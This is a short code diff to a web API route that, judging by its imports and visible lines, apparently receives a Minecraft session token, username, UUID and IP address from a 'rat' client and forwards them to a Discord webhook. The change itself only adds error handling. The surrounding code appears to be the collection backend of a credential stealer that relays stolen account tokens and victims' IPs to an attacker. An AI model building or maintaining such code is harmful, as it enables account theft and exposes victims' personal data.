@@ -6,6 +6,7 @@ import parseWebhook from "../../../../libs/discord/utils/parseRatWebhook";
 import getSessionInfo from "../../../../libs/microsoft/getSessionInfo";
 
 export const post: APIRoute = async ({ request }) => {
+  try {
   const resText = await request.text();
   if (!await (isJson(resText))) {
       return await res(400, "Invalid Body");
@@ -40,6 +41,10 @@ export const post: APIRoute = async ({ request }) => {
   const webhookBody:any = await parseWebhook(username, uuid, body.minecraft.token, ip, body);
   sendWebhook(webhook, webhookBody);
   return await res(200, "Success");
+  } catch (e) {
+    console.log(e);
+    return await res(500, "Internal Server Error");
+  }
 }
 
 async function res(status:number, message:string) {
